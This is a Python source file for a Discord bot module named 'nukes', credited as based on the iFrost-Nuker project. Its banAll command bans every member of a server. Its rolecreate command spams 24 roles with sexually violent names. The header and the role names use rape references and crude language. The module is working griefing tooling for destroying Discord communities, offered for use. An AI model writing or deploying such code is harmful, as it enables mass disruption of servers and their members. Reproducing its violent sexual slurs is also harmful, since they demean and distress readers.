import discord
from discord.ext import commands
from discord.ext import tasks
from colorama import Fore, init


#################################################################################
#                                                                               #
# This is a higly dangerous and volitile module please for the love of fuck     #
# Don't "accidentally" run shit in here then cry when you get raped by discord  #
# or the server gets nuked for example lol. It's just no it doesn't work well   #
#                                                                               #
# So please for the love of fucking god be CAREFUL                              #
#                                                                               #
#################################################################################


# NOTE: A lot of this code is based on the iFrost-Nuker which can be found here
# https://github.com/iFrost1337/iFrost-Nuker


class nukes(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def banAll(self, ctx):
        """Bans all members in the guild the command is used"""
        await ctx.message.delete()
        await ctx.send(
            "Well shit looks like this is getting nuked\n:wave:Bye Bye Members"
        )
        await ctx.send("Please stand by...")
        print(
            f"{Fore.RED}[-]DANGER > {Fore.RESET}Starting to ban all members of {ctx.guild} "
        )
        for member in ctx.guild.members:
            try:
                await member.ban()
            except:
                continue

    @commands.command()
    async def rolecreate(self, ctx):
        """Mass creates

        Usage
        • rolecreate
        """
        await ctx.message.delete()
        await ctx.send("Spamming role creation..")
        await ctx.send("Please wait...")
        print("Spam role creating procession has begun!")
        for i in range(1, 25):
            await ctx.guild.create_role(name=f"RAPED BY DISCORAPE {i}")
            await ctx.send(f"Made channel > RAPED BY DISCORAPE {i}")



def setup(bot):
    bot.add_cog(nukes(bot))
